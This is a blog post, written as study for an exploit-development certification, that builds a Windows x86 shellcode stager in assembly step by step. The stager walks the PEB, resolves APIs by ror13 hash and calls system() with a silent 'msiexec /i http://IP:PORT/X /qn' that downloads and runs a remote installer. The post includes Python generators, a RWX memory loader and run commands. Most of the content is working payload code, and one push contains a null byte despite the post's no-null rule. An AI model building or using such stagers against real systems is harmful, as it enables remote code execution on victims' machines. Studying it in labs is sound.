---
layout: post
slug: cooking-a-custom-x86-stager-in-asm
title: cooking a custom x86 stager in asm
tags: [shellcode, osed, windows]
---

Follow me in this deep dive into building a position‑independent `msiexec` stager for x86 win. We'll build the entire shellcode from assembly, using only stack strings, hash‑based api resolution, and a few null‑free tricks. It'll be fun!

I will heavily rely on the [shellcoder.py](https://github.com/epi052/osed-scripts/blob/main/shellcoder.py#L289) script by epi052. I do recommend checking the rest of the scripts of his osed-scripts repo. Pure gold.

Heads up, I'm just a 1337 in terms of binary exploitation. The thing is that I'm prepping for OSED cert and this article is a way of commit myself to understand the concepts. This is the Feyman technique of studying: trying to teach somebody else.

## the plan

At a 30,000 feet high level overview, our payload will do the following:

1. locate `kernel32.dll` via the PEB.
2. resolve `LoadLibraryA` and `TerminateProcess` by hash.
3. load `msvcrt.dll` using `LoadLibraryA`.
4. resolve `system()` from `msvcrt.dll` by hash.
5. build the command string `"msiexec /i http://IP:PORT/X /qn"` on the stack.
6. call `system()` with that command.
7. exit gracefully with `TerminateProcess`.

## step 0: reserve stack space

We also set up a stable base pointer and reserve some stack space:

```nasm
start:
    mov ebp, esp                 ; stable landmark
    add esp, 0xfffff9f0          ; esp -= 0x610 (~1.5KB workspace)
```

`ebp` never moves again – we stash function pointers relative to it. `0xfffff9f0` avoids null bytes (unlike `sub esp, 0x610`). Null‑byte golf starts here.

## step 1: psst, psst, kernel32.dll where are you?

We want to find where is dinamically loaded the kernell32.dll library. It is always loaded, and it have interesting functions like LoadLibrary or TerminateProcess. And we can use LoadLibrary to dinamically load new dlls and thus, more functions. A myriad of possibilities, hellyeah!

Why \*dynamically\*? You could hardcode its address, BUT it is dependent on the specific Windows versions and patches. We do like determinism. Let's play it safe.

Every win32 thread has a thing called **TEB** (Thread Environment Block), reachable via the `fs` segment register. 

At `fs:[0x30]` lies the **PEB** (Process Environment Block), which contains the list of loaded dlls.

So:
```
fs:[0x30]  ->  PEB
PEB + 0x0C ->  Ldr (loader data)
Ldr + 0x1C ->  InInitOrderModuleList  (chain of loaded DLLs)
each node:  +0x08 = base address, +0x20 = name (UTF‑16), +0x00 = "next" pointer
```

The asm below walks the chain until it finds a module whose name is exactly 12 characters (spoiler: will be our `kernel32.dll`):

```nasm
find_kernel32:
    xor ecx,ecx                  ; ECX = 0
    mov esi,fs:[ecx+30h]         ; ESI = PEB
    mov esi,[esi+0Ch]            ; ESI = PEB->Ldr
    mov esi,[esi+1Ch]            ; ESI = Ldr.InInitOrder
next_module:
    mov ebx, [esi+8h]            ; EBX = module base address
    mov edi, [esi+20h]           ; EDI = module name (wide chars)
    mov esi, [esi]               ; ESI = next entry
    cmp [edi+12*2], cx           ; name[12] == 0x00 ?
    jne next_module              ; no -> keep walking
```

Names are UTF‑16, so `12*2 = 24` bytes in is the 13th character. If it's null, the name is exactly **12 characters**: `kernel32.dll`. So this loop exits with **EBX = kernel32 base address**.

You might ask:
> what if the first DLL that has 12 chars is \*not\* `kernel32.dll`? You're just checking the lenght... Plenty of DLLs are 12 chars: advapi32.dll, comctl32.dll, wow64win.dll...

You are right, this is a dirty trick that werks because if you execute early enough (before the loader pulls in the exe's other dependencies), the module list is tiny and predictable.

An alternative would be something like this, where we lowercase the library names, and verify the ror13 hash matches with the expected one. (We will explore ror13 hashes in next section, don't be afraid.)

```nasm
find_kernel32:
    xor ecx, ecx                 ; ECX = 0
    mov esi, fs:[ecx+30h]        ; ESI = PEB
    mov esi, [esi+0Ch]           ; ESI = PEB->Ldr
    mov esi, [esi+1Ch]           ; ESI = InInitOrder
next_module:
    mov ebx, [esi+8h]            ; EBX = DllBase
    mov edi, [esi+20h]           ; EDI = name (wide chars)
    mov esi, [esi]               ; advance FIRST - we're done with this entry
    xor edx, edx                 ; module hash = 0
mod_hash:
    movzx eax, byte ptr [edi]    ; low byte of the wide char
    test al, al
    jz mod_hash_done             ; wide null = end of name
    cmp al, 0x41                 ; 'A'
    jb mod_hash_rot
    cmp al, 0x5A                 ; 'Z'
    ja mod_hash_rot
    add al, 0x20                 ; downcase
mod_hash_rot:
    ror edx, 0x0D
    add edx, eax
    add edi, 2                   ; skip the 00 high byte
    jmp mod_hash
mod_hash_done:
    cmp edx, 0xB1FC7F66          ; ror13("kernel32.dll")
    jne next_module
```

Is this more deterministic than the previous version? Yes, \*but\* it takes more bytes, so we will stick to the previous one, if you don't mind. 


## step 2: winapi function hashes

We have located our DLL, but now we need to call its functions. What happens if we don't have loaded certain DLL? We can use `LoadLibrary` since it lives in kernel32, and that's always loaded.

Instead of hardcoding function names in the shellcode (which wastes bytes and risks badchars), we will use a 4‑byte fingerprint for each api. Cool, huh?

### the ror13 algorithm
For each character of the name we use an hashing algorithm called `ror13`, which means that we must rotate right 13 bits, add the character, stopping at the null terminator.

I hear your head buzzing. Stay with me! Let's illustrate it with an specific example:

`A` in hex is `0x00000041` (duh), in bits is `00000000 00000000 00000000 01000001`.

Now we have to rotate right the bits one by one until 13. Think of ror like pacman, you move to the right, and if you ends the size, you start from the left side.
So this is the process under the hood:

```
ror 0:  00000000 00000000 00000000 01000001   ← starting point
ror 1:  10000000 00000000 00000000 00100000   ← rightmost 1 falls off, reappears at far left
ror 2:  01000000 00000000 00000000 00010000
ror 3:  00100000 00000000 00000000 00001000
ror 4:  00010000 00000000 00000000 00000100
ror 5:  00001000 00000000 00000000 00000010
ror 6:  00000100 00000000 00000000 00000001   ← the other 1 reaches the edge
ror 7:  10000010 00000000 00000000 00000000   ← it falls off, wraps to the left
ror 8:  01000001 00000000 00000000 00000000
ror 9:  00100000 10000000 00000000 00000000
ror 10: 00010000 01000000 00000000 00000000
ror 11: 00001000 00100000 00000000 00000000
ror 12: 00000100 00010000 00000000 00000000
ror 13: 00000010 00001000 00000000 00000000   ← finish line
```

Cool, then `00000010 00001000 00000000 00000000` is the output of the rotating these bits.
So, the final step to get the Final ROR13 Hash is to convert it to hex. In this case, `ror13(0x00000041)` is `0x02080000`.

### ror13 but in python

OK, now that we understood it in English, let's review [the python helpers defined by epi052](https://github.com/epi052/osed-scripts/blob/main/shellcoder.py#L28-L44):

```python
def ror_str(byte, count):
    binb = numpy.base_repr(byte, 2).zfill(32)
    while count > 0:
        binb = binb[-1] + binb[0:-1]
        count -= 1
    return int(binb, 2)

def push_function_hash(function_name):
    edx = 0x00
    ror_count = 0
    for eax in function_name:
        edx = edx + ord(eax)
        if ror_count < len(function_name)-1:
            edx = ror_str(edx, 0xd)      # rotate between chars, not after last
        ror_count += 1
    return f"push {hex(edx)}"
```

**Important:** note that the last char is added but not rotated. 

Let's debug the for `LoadLibraryA`:

```
edx = 0

edx += 'L' (0x4C)  -> 0x0000004C, ror13 -> 0x02600000
edx += 'o' (0x6F)  -> 0x0260006F, ror13 -> 0x03781300
edx += 'a' (0x61)  -> 0x03781361, ror13 -> 0x9B081BC0
edx += 'd' (0x64)  -> 0x9B081C24, ror13 -> 0xE124D840
edx += 'L' (0x4C)  -> 0xE124D88C, ror13 -> 0xC4670926
edx += 'i' (0x69)  -> 0xC467098F, ror13 -> 0x4C7E2338
edx += 'b' (0x62)  -> 0x4C7E239A, ror13 -> 0x1CD263F1
edx += 'r' (0x72)  -> 0x1CD26463, ror13 -> 0x2318E693
edx += 'a' (0x61)  -> 0x2318E6F4, ror13 -> 0x37A118C7
edx += 'r' (0x72)  -> 0x37A11939, ror13 -> 0xC9C9BD08
edx += 'y' (0x79)  -> 0xC9C9BD81, ror13 -> 0xEC0E4E4D
edx += 'A' (0x41)  -> 0xEC0E4E8E   <- last char: add only, no rotate

push 0xec0e4e8e
```

OK, I think you (we) get it now. 

> But could we then just hardcode the values of the functions we want to call, rather than calcling the hashes dinamically?

Yes, you can. But it does not hurt to understand what's under the hood, right?

## step 3: stacking strings like lego blocks

You don't want to embed string literals directly, but build them on the stack using `push`. 

This is the context:
- stack grows **down**: push the **tail** of the string first.
- x86 is **little‑endian**: flip byte order inside each 4‑byte chunk.
- nulls are free: `xor eax, eax; push eax` puts a terminator *above* the string (pushed first = highest address = end of string).
- for leftover odd bytes, we load them into `al`/`ax` on a zeroed `eax` and push.

Again, [this epi052 helper](https://github.com/epi052/osed-scripts/blob/main/shellcoder.py#L47-L78) converts a string to a sequence of `push` instructions:

```python
def push_string(input_string):
    rev_hex_payload = str(to_hex(input_string))   # "cmd" -> "636d64"
    rev_hex_payload_len = len(rev_hex_payload)

    instructions = []
    first_instructions = []
    for i in range(rev_hex_payload_len, 0, -1):
        if ((i != 0) and ((i % 8) == 0)):
            target_bytes = rev_hex_payload[i-8:i]
            instructions.append(f"push dword 0x{target_bytes[6:8] + target_bytes[4:6] + target_bytes[2:4] + target_bytes[0:2]};")
        elif ((0 == i-1) and ((i % 8) != 0) and (rev_hex_payload_len % 8) != 0):
            if (rev_hex_payload_len % 8 == 2):
                first_instructions.append(f"mov al, 0x{rev_hex_payload[(rev_hex_payload_len - (rev_hex_payload_len%8)):]};")
                first_instructions.append("push eax;")
            elif (rev_hex_payload_len % 8 == 4):
                target_bytes = rev_hex_payload[(rev_hex_payload_len - (rev_hex_payload_len%8)):]
                first_instructions.append(f"mov ax, 0x{target_bytes[2:4] + target_bytes[0:2]};")
                first_instructions.append("push eax;")
            else:
                target_bytes = rev_hex_payload[(rev_hex_payload_len - (rev_hex_payload_len%8)):]
                first_instructions.append(f"mov al, 0x{target_bytes[4:6]};")
                first_instructions.append("push eax;")
                first_instructions.append(f"mov ax, 0x{target_bytes[2:4] + target_bytes[0:2]};")
                first_instructions.append("push ax;")
    instructions = first_instructions + instructions
    return "".join(instructions)
```

Trace `"AAAABBBB"` → hex `4141414142424242`. Loop walks from the end: pushes `0x42424242` ("BBBB") first, then `0x41414141` ("AAAA"). Memory low→high: `AAAA BBBB`. Reads correctly.

**Golden rule:** never `push 0x00636d64` – the `00` would become shellcode bytes. Build values in registers (`mov al`, `inc`, `sub`, `neg`) then `push reg`. `push reg` is 1 byte, no immediate nulls.


## step 4: the hash resolver – walking the export table

A DLL's **export table** is three parallel arrays:

```
Export Directory (at PE_base + RVA 0x78)
 +0x18  NumberOfNames
 +0x1C  AddressOfFunctions   (RVA of code, 4 bytes each)
 +0x20  AddressOfNames       (RVA of name string, 4 bytes each)
 +0x24  AddressOfNameOrdinals (2 bytes each)
```

**RVA vs VMA:** VMA = base + RVA.

First, we save the resolver's own address using a classic trick:

```nasm
find_function_shorten:
    jmp find_function_shorten_bnc
find_function_ret:
    pop esi                      ; esi = address of find_function
    mov [ebp+0x04], esi          ; stash it forever
    jmp resolve_symbols
find_function_shorten_bnc:
    call find_function_ret       ; CALL pushes the address of the NEXT instruction
```

`call` pushes the address of whatever comes next – which is `find_function`. `pop esi` grabs it. Now we know where our own code lives, without any hardcoded address.

The resolver itself:

```nasm
find_function:
    pushad                       ; save all 8 registers (32 bytes)
    mov eax, [ebx+0x3c]          ; PE header offset (e_lfanew)
    mov edi, [ebx+eax+0x78]      ; export directory RVA
    add edi, ebx                 ; -> VMA
    mov ecx, [edi+0x18]          ; NumberOfNames
    mov eax, [edi+0x20]          ; AddressOfNames RVA
    add eax, ebx
    mov [ebp-4], eax             ; save for loop
find_function_loop:
    jecxz find_function_finished
    dec ecx
    mov eax, [ebp-4]
    mov esi, [eax+ecx*4]         ; RVA of name #ecx
    add esi, ebx                 ; -> VMA
compute_hash_again:
    lodsb                        ; al = *esi++, walk the name
    test al, al                  ; null terminator?
    jz compute_hash_finished
    ror edx, 0x0d                ; rotate 13
    add edx, eax                 ; add char
    jmp compute_hash_again
```

Comparison uses the stack layout from `pushad`. The hash was pushed right before the `call`, so it sits at `[esp+0x24]`:

```nasm
find_function_compare:
    cmp edx, [esp+0x24]          ; computed hash == wanted hash?
    jnz find_function_loop
    mov edx, [edi+0x24]          ; AddressOfNameOrdinals RVA
    add edx, ebx
    mov cx, [edx+2*ecx]          ; ordinal
    mov edx, [edi+0x1c]          ; AddressOfFunctions RVA
    add edx, ebx
    mov eax, [edx+4*ecx]         ; function RVA
    add eax, ebx                 ; -> VMA. Got it.
    mov [esp+0x1c], eax          ; write into saved-EAX slot
find_function_finished:
    popad                        ; EAX comes back loaded with the answer
    ret
```

Usage pattern: push hash, call resolver, stash result:

```nasm
resolve_symbols:
    push 0x...                   ; hash of TerminateProcess
    call dword ptr [ebp+0x04]    ; find_function
    mov [ebp+0x10], eax          ; save address
    push 0x...                   ; hash of LoadLibraryA
    call dword ptr [ebp+0x04]
    mov [ebp+0x14], eax
```

## step 5: load msvcrt.dll and resolve system()

Now we load the C runtime DLL by name – again, built on the stack:

```nasm
load_msvcrt:
    xor eax, eax
    push eax                     ; null terminator
    push 0x00747263              ; "trc"
    push 0x2e76736d              ; "vsm."
    push esp                     ; pointer to "msvcrt.dll\0"
    call dword ptr [ebp+0x14]    ; LoadLibraryA
    mov ebx, eax                 ; EBX = msvcrt base
```

We then resolve `system` using the same resolver:

```nasm
    push 0x...                   ; hash of system
    call dword ptr [ebp+0x04]    ; find_function
    mov [ebp+0x1C], eax          ; save system() address
```

## step 6: build the msiexec command string

The command is:

```
msiexec /i http://IP:PORT/X /qn
```

We build it on the stack in reverse order – tail first. Because the string length may not be a multiple of 4, we pad with spaces (`0x20`) at the end (which actually appear at the *beginning* of the string in memory, but we'll push them last, so they end up correctly).

Python helper to generate the pushes for a padded string:

```python
def build_command(ip, port):
    cmd = f"msiexec /i http://{ip}:{port}/X /qn"
    # pad to multiple of 4 with spaces
    if len(cmd) % 4 != 0:
        cmd += " " * (4 - (len(cmd) % 4))
    return push_string(cmd)
```

In ASM, after pushing all chunks, we push a null terminator, then `push esp` to get a pointer to the string, and finally `call system`:

```nasm
call_system:
    ; ... pushes generated by Python ...
    push esp                     ; pointer to the command string
    call dword ptr [ebp+0x1C]    ; system()
```

Because `system()` expects a single null‑terminated string, the stack pointer now points exactly to `"msiexec /i http://..."`.

## step 7: clean exit

After `system()` returns, we terminate the current process:

```nasm
exit:
    xor ecx, ecx
    push ecx                     ; uExitCode = 0
    push 0xffffffff              ; hProcess = pseudo‑handle "myself"
    call dword ptr [ebp+0x10]    ; TerminateProcess
```

The parent dies. The installer runs detached.

## step 8: assemble, check for bad chars, test

Keystone turns the ASM text into bytes:

```python
eng = ks.Ks(ks.KS_ARCH_X86, ks.KS_MODE_32)
encoding, count = eng.asm(shellcode)
```

Bad‑char scan:

```python
final = 'shellcode = b"'
for enc in encoding:
    final += "\\x{0:02x}".format(enc)
final += '"'

for bad in args.bad_chars:
    if bad in final:
        raise SystemExit(f"[!] Found 0x{bad:02x} – remove and retry")
```

If any bad bytes appear, re‑encode with msfvenom or tweak the assembly (use `neg` / `sub` / `inc` to avoid hardcoded values).

Optional local test – allocate RWX memory, copy the bytes, and execute as a thread:

```python
ptr = ctypes.windll.kernel32.VirtualAlloc(0, len(buf), 0x3000, 0x40)
ctypes.windll.kernel32.RtlMoveMemory(ptr, buf, len(buf))
ht = ctypes.windll.kernel32.CreateThread(0, 0, ptr, 0, 0, 0)
ctypes.windll.kernel32.WaitForSingleObject(ht, -1)
```

(Always run in a lab VM.)

---

## step 9: run it

```bash
# Start a web server hosting the .msi (or use any URL)
python -m http.server 8000

# Generate the shellcode
python shellforge.py -i 192.168.1.100 -p 8000

# To get raw bytes for embedding
python shellforge.py -i 192.168.1.100 -p 8000 -s
```

The payload will download and run `X.msi` (replace `X` with your actual MSI filename) silently.

## bottom line

The `msiexec` stager is a minimal, reliable way to run a remote installer via `system()`. The engine we built – PEB walking, hash‑based resolution, and null‑free stack string construction – is reusable for any WinAPI call.

To truly own the material:

1. Run this payload under a debugger (`-d`) and step through the PEB walk until it's boring.
2. Add a new function (e.g., `WinExec`) from `kernel32` – generate its hash and call it.
3. Modify the command string to include a different URL or additional flags.
4. Re‑write the `push_string` logic for a 3‑character string and trace the stack layout.

The core concepts scale to any shellcode you'll ever write on Windows.
